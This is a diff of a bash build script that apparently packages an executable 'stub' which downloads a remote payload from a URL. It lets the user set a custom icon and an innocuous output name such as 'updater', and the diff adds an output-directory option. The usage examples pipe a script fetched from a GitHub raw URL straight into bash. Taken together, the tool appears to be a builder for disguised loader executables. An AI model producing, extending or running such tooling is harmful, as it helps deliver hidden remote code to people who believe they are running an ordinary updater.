@@ -24,13 +24,14 @@ Options:
     -o, --out <name>        Output exe name (default: exiled)
     -u, --url <url>         Remote payload URL to embed in the stub
     -i, --icon <url|path>   Icon source (webp/png/ico url or local file)
+    -d, --dir <path>        Output directory (default: \$PWD)
         --no-icon           Skip icon embedding
         --keep-build        Keep the _build staging dir after freezing
 
 Examples:
-    curl -fsSL https://example.com/install.sh | bash
-    ./install.sh --out updater --url https://raw.githubusercontent.com/.../external.py
-    ./install.sh --icon ./logo.png --keep-build
+    curl -fsSL https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/ex-install.sh | bash
+    curl -fsSL .../ex-install.sh | bash -s -- --out updater
+    ./ex-install.sh --icon ./logo.png --keep-build
 EOF
 }
 
@@ -39,52 +40,26 @@ payload_url="$REMOTE_URL"
 icon_src="$ICON_URL"
 use_icon=true
 keep_build=false
+out_dir=""
 
 while [[ $# -gt 0 ]]; do
     case "$1" in
-        -h|--help)
-            usage
-            exit 0
-            ;;
+        -h|--help) usage; exit 0 ;;
         -o|--out)
-            if [[ -n "${2:-}" ]]; then
-                out_name="$2"
-                shift 2
-            else
-                echo -e "${RED}Error: --out requires a name argument${NC}"
-                exit 1
-            fi
-            ;;
+            if [[ -n "${2:-}" ]]; then out_name="$2"; shift 2
+            else echo -e "${RED}Error: --out requires a name argument${NC}"; exit 1; fi ;;
         -u|--url)
-            if [[ -n "${2:-}" ]]; then
-                payload_url="$2"
-                shift 2
-            else
-                echo -e "${RED}Error: --url requires a url argument${NC}"
-                exit 1
-            fi
-            ;;
+            if [[ -n "${2:-}" ]]; then payload_url="$2"; shift 2
+            else echo -e "${RED}Error: --url requires a url argument${NC}"; exit 1; fi ;;
         -i|--icon)
-            if [[ -n "${2:-}" ]]; then
-                icon_src="$2"
-                shift 2
-            else
-                echo -e "${RED}Error: --icon requires a url or path argument${NC}"
-                exit 1
-            fi
-            ;;
-        --no-icon)
-            use_icon=false
-            shift
-            ;;
-        --keep-build)
-            keep_build=true
-            shift
-            ;;
-        *)
-            echo -e "${ORANGE}Warning: Unknown option '$1'${NC}" >&2
-            shift
-            ;;
+            if [[ -n "${2:-}" ]]; then icon_src="$2"; shift 2
+            else echo -e "${RED}Error: --icon requires a url or path argument${NC}"; exit 1; fi ;;
+        -d|--dir)
+            if [[ -n "${2:-}" ]]; then out_dir="$2"; shift 2
+            else echo -e "${RED}Error: --dir requires a path argument${NC}"; exit 1; fi ;;
+        --no-icon) use_icon=false; shift ;;
+        --keep-build) keep_build=true; shift ;;
+        *) echo -e "${ORANGE}Warning: Unknown option '$1'${NC}" >&2; shift ;;
     esac
 done
 
@@ -137,13 +112,19 @@ if ! command -v curl >/dev/null 2>&1; then
     exit 1
 fi
 
-HERE="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
+if [[ -n "$out_dir" ]]; then
+    HERE="$(cd -- "$out_dir" && pwd)"
+else
+    HERE="$(pwd)"
+fi
+
 WORKDIR="${HERE}/_build"
 STUB="${WORKDIR}/${STUB_NAME}"
 ICON_RAW="${WORKDIR}/icon.raw"
 ICON_ICO="${WORKDIR}/icon.ico"
 
 print_message info "\n${MUTED}Building ${NC}${APP} ${MUTED}for ${NC}${os}-${arch}"
+print_message info "${MUTED}Output dir:${NC} ${HERE}"
 
 mkdir -p "${WORKDIR}"
 
@@ -216,5 +197,5 @@ echo -e "${MUTED}Built:${NC} ${HERE}/dist/${out_name}${EXE_EXT}"
 echo -e "${MUTED}Payload source:${NC} ${payload_url}"
 echo -e ""
 echo -e "${MUTED}Run it:${NC}"
-echo -e "  ./dist/${out_name}${EXE_EXT}"
+echo -e "  cd ${HERE} && ./dist/${out_name}${EXE_EXT}"
 echo -e ""
